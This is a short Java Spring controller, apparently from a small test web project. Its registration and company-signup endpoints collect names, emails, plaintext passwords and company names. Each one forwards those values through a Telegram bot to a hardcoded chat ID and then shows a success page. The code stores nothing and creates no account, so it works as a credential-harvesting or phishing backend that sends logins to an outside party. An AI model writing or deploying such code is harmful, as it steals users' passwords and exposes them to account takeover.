package com.example.testwebb.controller;

import com.example.testwebb.MyTelegramBot;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
@RequestMapping
@RequiredArgsConstructor
public class Aasdfghgfds {

    private final MyTelegramBot myTelegramBot;

    @GetMapping("/admin")
    public String admin() {
        return "/index";
    }

    @PostMapping("/register")
    public String post(@RequestParam String name, @RequestParam String email,
                       @RequestParam String password) {
        myTelegramBot.sendMessage(name+" "+email+" "+password,1817365313L);
        return "main";
    }
    @PostMapping("/kompaniya")
    public String aaaa(@RequestParam String name, @RequestParam String email,
                       @RequestParam String password,@RequestParam String kompaniya) {
        myTelegramBot.sendMessage(name+" "+email+" "+password+" "+kompaniya,1817365313L);
        return "sessufuli";
    }

    @GetMapping("/qushish")
    public String qushish() {
        return "qushish";
    }
    @GetMapping("/main")
    public String m() {
        return "main";
    }
}
